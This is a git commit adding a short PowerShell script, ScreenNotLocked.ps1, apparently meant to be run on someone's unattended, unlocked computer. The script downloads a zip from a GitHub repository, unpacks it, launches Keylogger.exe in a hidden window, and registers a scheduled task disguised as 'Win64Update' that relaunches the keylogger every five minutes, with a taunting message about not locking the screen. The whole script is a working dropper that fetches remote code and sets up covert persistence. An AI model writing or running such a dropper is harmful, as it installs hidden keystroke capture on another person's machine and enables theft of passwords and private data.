71e5d945617805e4540b67f487a739b98d3c903f
Martijn <45517189+MartijnJStans@users.noreply.github.com>
2022-06-21 22:30:23 +0200

    Add files via upload

---
+++ ScreenNotLocked.ps1
@@ -0,0 +1,13 @@
+﻿$FolderName = "C:\temp\"
+if (Get-Item -Path $FolderName -ErrorAction Ignore) {
+} else {
+    New-Item $FolderName -ItemType Directory
+}
+
+Invoke-WebRequest -Uri "https://github.com/MartijnJStans/ScreenNotLocked/archive/refs/heads/main.zip" -OutFile "C:\temp\KeyLogger.zip"
+Expand-Archive -LiteralPath "C:\temp\KeyLogger.zip"
+Start-Process -FilePath "C:\temp\KeyLogger\ScreenNotLocked-main\Keylogger.exe" -WindowStyle Hidden
+
+$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument 'Start-Process -FilePath "C:\temp\KeyLogger\ScreenNotLocked-main\Keylogger.exe" -WindowStyle Hidden'
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Win64Update" -Description "Hey buddy, Did you forget something? Maybe next time lock your screen"
